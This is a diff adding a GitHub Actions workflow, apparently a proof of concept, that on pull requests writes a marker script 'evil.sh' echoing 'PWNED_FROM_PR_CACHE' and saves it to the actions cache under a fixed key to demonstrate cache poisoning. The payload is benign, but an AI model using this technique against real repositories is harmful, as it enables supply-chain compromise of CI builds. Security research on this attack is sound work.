@@ -1,0 +1,15 @@
+name: poison-cache
+on: pull_request
+jobs:
+  poison:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          mkdir -p evil-bin
+          printf '#!/bin/bash\necho PWNED_FROM_PR_CACHE\n' > evil-bin/evil.sh
+          chmod +x evil-bin/evil.sh
+      - name: Save poisoned cache in PR scope
+        uses: actions/cache@v3
+        with:
+          path: evil-bin
+          key: POC-CACHE-KEY
